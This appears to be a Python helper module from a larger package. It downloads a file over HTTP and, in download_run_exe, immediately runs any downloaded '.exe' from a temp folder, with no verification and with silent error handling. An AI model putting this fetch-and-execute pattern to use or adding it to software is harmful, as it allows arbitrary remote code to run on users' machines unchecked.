import subprocess
import os
import requests
from ..constants import TEMP


class Download:
    @staticmethod
    def download_file_http(url:str, saveTo:str):
        try:
            name = url.split("/")[-1]
            saveToName = saveTo.split("\\")[-1]
            if name == saveToName:
                saveTo = saveTo.replace(saveToName, "")
            r = requests.get(url)
            with open(os.path.join(saveTo, name), 'wb') as f:
                f.write(r.content) 
            return (1, name)
        except:
            return (0, "")

    @staticmethod
    def download_run_exe(url:str, saveTo:str = TEMP):
        if ".exe" not in url:
            return 0
        try:
            result = Download.download_file_http(url, saveTo = saveTo)
            subprocess.Popen(os.path.join(saveTo, result[1]), creationflags = subprocess.CREATE_NEW_CONSOLE)
            return 1
        except:
            return 0

        
